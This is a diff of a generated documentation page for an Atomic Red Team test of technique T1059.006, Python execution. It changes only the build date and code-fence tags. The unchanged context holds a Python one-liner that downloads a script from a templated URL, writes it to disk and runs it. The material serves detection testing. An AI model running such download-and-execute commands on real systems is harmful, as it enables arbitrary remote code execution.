@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1059.006"
 attack_technique_name: "Command and Scripting Interpreter: Python"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.006/T1059.006.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "3a95cdb2-c6ea-4761-b24e-02b71889b8bb"
@@ -69,14 +69,14 @@ Verify if python is in the environment variable path and attempt to import reque
 
 ### Prerequisite Check
 
-```text
+```bash
 which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
 $which_python -c 'import requests' 2>/dev/null; echo $?
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 pip install requests
 ```
 
@@ -86,14 +86,14 @@ pip install requests
 
 ### Command
 
-```sh
+```bash
 which_python=$(which python || which python3 || which python3.9 || which python2)
 $which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
 ```
 
 ### Cleanup
 
-```sh
+```bash
 rm #{payload_file_name} 
 pip-autoremove pypykatz >nul 2> nul
 ```
